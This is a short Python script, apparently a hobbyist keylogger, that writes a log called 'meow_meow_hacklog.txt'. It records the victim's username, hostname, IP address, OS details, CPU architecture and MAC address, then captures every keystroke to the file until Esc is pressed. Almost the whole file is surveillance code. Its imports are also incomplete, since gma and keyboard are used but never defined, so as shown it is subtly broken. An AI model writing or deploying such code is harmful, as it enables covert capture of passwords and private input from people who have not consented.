from datetime import datetime
import os 
import getpass
import socket
import platform
import uuid

textname = 'meow_meow_hacklog.txt'


#DATE AND TIME
def dateandtime():
    dateandtimenow = datetime.now()
    with open(textname, 'w') as file:
        file.write('DATE AND TIME RAN: \n'+ str(dateandtimenow) + '\n')
        file.write('\n')
dateandtime()


#USER NAME
def username():
    usernameofpc = getpass.getuser()
    with open(textname, 'a') as file:
        file.write('PC USERNAME: \n'+ str(usernameofpc) + '\n')
        file.write('\n')
username()


#DEVICE NAME
def devname():
    devicename = socket.gethostname()
    with open(textname, 'a') as file:
        file.write('DEVICE NAME: \n'+ str(devicename) + '\n')
        file.write('\n') 
devname()


#IP ADDRESS
def ipaddr():
    devicename = socket.gethostname()
    ipaddress = socket.gethostbyname(devicename)
    with open(textname, 'a') as file:
            file.write('IP: \n'+ str(ipaddress) + '\n')
            file.write('\n') 
ipaddr()


#OS NAME
def osnameversion():
    osname = platform.uname()
    with open(textname, 'a') as file:
            file.write('OS NAME: \n'+ str(osname) + '\n')
            file.write('\n') 
osnameversion()


#CPU ARCHITECTURE
def cpuarchi():
    cpu = platform.architecture()
    with open(textname, 'a') as file:

            file.write('CPU ARCHITECTURE: \n'+ str(cpu) + '\n')
            file.write('\n') 
cpuarchi()

#MAC ADDRESS
def macaddr():
    mac_addr = gma()
    with open(textname, 'a') as file:
            file.write('MAC ADDRESS: \n'+ str(mac_addr) + '\n')
            file.write('\n') 
macaddr()

def on_press(key):
    with open(textname, 'a') as file:
        try:
            file.write(f"{key.char} ")
        except AttributeError:
            file.write(f"[{key.name}] ")

        file.flush()

        if key == keyboard.Key.esc:
            file.write("\n[Keylogger stopped]\n")
            file.close()
            return False  # This stops the listener


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
